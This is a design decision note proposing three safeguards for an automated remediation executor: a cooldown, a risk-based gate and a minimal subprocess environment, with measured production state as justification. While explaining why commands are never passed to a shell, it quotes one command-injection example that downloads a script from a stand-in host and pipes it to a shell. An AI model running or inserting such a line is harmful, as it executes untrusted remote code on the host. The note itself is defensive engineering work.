---
title: Three gaps to close before the execution door is ever opened
status: proposed
date: 2026-09-10
scope: hookprobe
---

## Decision

Three additive changes around the remediation executor. None of them opens the
execution door; they are what should already be true on the day an operator
first writes a line into `HOOKPROBE_REMEDIATION_ALLOWLIST`.

1. **A per-target cooldown.** A proposal declares a target, and approval is
   refused when that target executed within a configured window. Keyed on the
   automation ledger, which already records every approval, rather than on a
   second clock nobody reconciles.
2. **`risk` stops being decoration.** It is parsed and validated at
   `remediation.py:89-95` and consumed in exactly two places: a colour in
   `ui.html:1750` and the word in a button label at `actions.py:204-206`.
   Nothing gates on it. Make it a gate input — a `high` step wants a stricter
   condition than a `low` one — and let the cooldown read it too.
3. **The executor gets a constructed environment.** `execute()` calls
   `create_subprocess_exec` with no `env=` (`remediation.py:472`), so an
   approved command inherits the whole service environment, `HOOKPROBE_TOKEN`
   included. Pass an explicit minimal env. That is also the only sane place to
   attach a short-lived credential later — `aws sts assume-role`, a
   `kubectl --token`, taken at approval and dropped when the process exits.

Deliberately NOT in this note, each for a different reason:

* **Negative-feedback verification** ("did the fix make it worse") is worth
  having and cannot be shaped the way it is usually drawn. The production
  investigator holds no credentials for the systems it writes procedures about,
  and a watchdog that opened one would be a second, unaudited way of touching
  them — the same constraint the freshness cursor row already states. It has to
  read the pipe's NEXT signal, not probe the target.
* **Proposals as pull requests** is a door, not a lock: this agent's bearer is
  refused on every method but `GET`, and the input guard exists to stop a run
  installing its own instructions. Giving it an outbound write path is a
  separate project with its own note, and it is the one idea in this family that
  NET INCREASES the attack surface.
* **Kernel-level syscall enforcement** as observation, yes; as `SIGKILL`, no —
  see the rejected note.

## Why

**The door has never been opened.** Measured on the production deployment on
2026-09-10, read from inside the running container rather than from a compose
default:

```
HOOKPROBE_REMEDIATION_ALLOWLIST = []      (empty: deny-by-default, nothing runs)
HOOKPROBE_AUTOMATION_TIERS      = []      (defaults; remediation = propose)
proposals on disk               = 5, every one of them `proposed`
automation ledger, remediation  = 5 proposed / 0 approved / 0 dismissed
```

That number decides the ordering. An entire class of hardening — ephemeral
credentials, sandboxed runtimes, second-approver rules — protects a path that
has executed nothing, ever. What is worth building first is not another lock on
that door; it is the three things that will be *missing* the first time somebody
opens it.

**Cooldown is the actual gap.** `grep -niE "cooldown|last_run|throttl|min_interval"`
over `remediation.py` and `actions.py` returns nothing. The approval window and
the freshness cursor both answer *"has the world moved since this was written"*.
Neither answers *"did we already do this to this target twenty minutes ago"*,
which is the question a flapping condition asks. The two are separate and both
are needed; the second one does not exist.

**The risk field is the cheapest hook in the codebase.** It already survives
extraction, validation, persistence, the card and the console. Everything needed
to make a decision from it is in place except the decision.

**Why the executor and not the container.** The usual framing — "the read-write
container has a cluster-writing token mounted around the clock" — does not
describe this estate. The production investigator holds no such credential at
all. The nodes that do (`probe-plan`, `probe-work`) mount them `:ro`, and
`posture.py` asks the cluster and IAM what that identity may actually do before
the first run, refusing to start when the credentials are wider than the declared
posture. The one place a genuine write credential belongs is the executor's
subprocess, and today that environment is whatever the service happened to have.
Fixing it needs no Vault and no new resident component — which matters, because
the egress proxy note just paid for the lesson that every new dependency is one
more thing that can be down.

**One thing worth naming so nobody misreads it.** `automation.permits()` is
called in exactly one place — `service.py:1162`, for `memory`/`auto_apply`. The
`remediation: propose` ceiling in `_DEFAULT_TIERS` is declared and consulted by
nothing. It is not a hole: there is no auto-apply path for remediation to
exceed it with, so the ceiling is vacuously true. But it reads like an enforced
gate and is not one, and change (2) is where it would get wired.

**And what the review that prompted this got half-right.** The critique that a
regex allowlist is still imperative — "the interpretation is left to string
matching" — misses that `execute()` lexes each command into an argv and never
touches a shell, precisely so that a pattern written with a wildcard cannot
hand the span to `/bin/sh`; the docstring names `kubectl rollout restart .*`
also permitting `; curl evil.sh | sh` as the reason. Full-match, not search,
closes the other classic. What genuinely remains is an operator pattern written
too wide, and the proportionate answer is to change the `command` string inside
the existing fenced `remediation` block into an `action` + `params` pair — the
block is already a schema with one free-text field — rather than to build a
parallel typed action surface.

## Consequences

* All three are additive, and the shipping default stays collect-only. Nothing
  here makes anything newly runnable.
* **The cooldown needs a target and a proposal has none.** Inferring one from
  the step commands is a guess dressed as a key. Doing it properly means the
  report declares it, which is a prompt change, which means the golden replay
  gates it — that is the cost, and it is the reason this is a note and not a
  patch.
* A constructed executor env will break any allowlisted command that quietly
  relied on an inherited variable. Nothing has ever executed, so today there is
  nothing to break: that is an argument for doing it now rather than after the
  first pattern is live.
* **Each of the three lands with an observed refusal, not with a branch.** The
  standing precedent is [[three-shapes-of-a-write]], where two of three write
  shapes had been leaking for the guard's whole life and only watching it refuse
  found them, and [[egress-by-policy-not-by-topology]], whose first version was
  defeated by one shell prefix and corrected the same day. A test that proves
  the cooldown refuses a timestamp a developer typed is not the claim.
* The parts of the same review that were declined, and why, are in
  [[two-person-review-needs-a-second-person]].
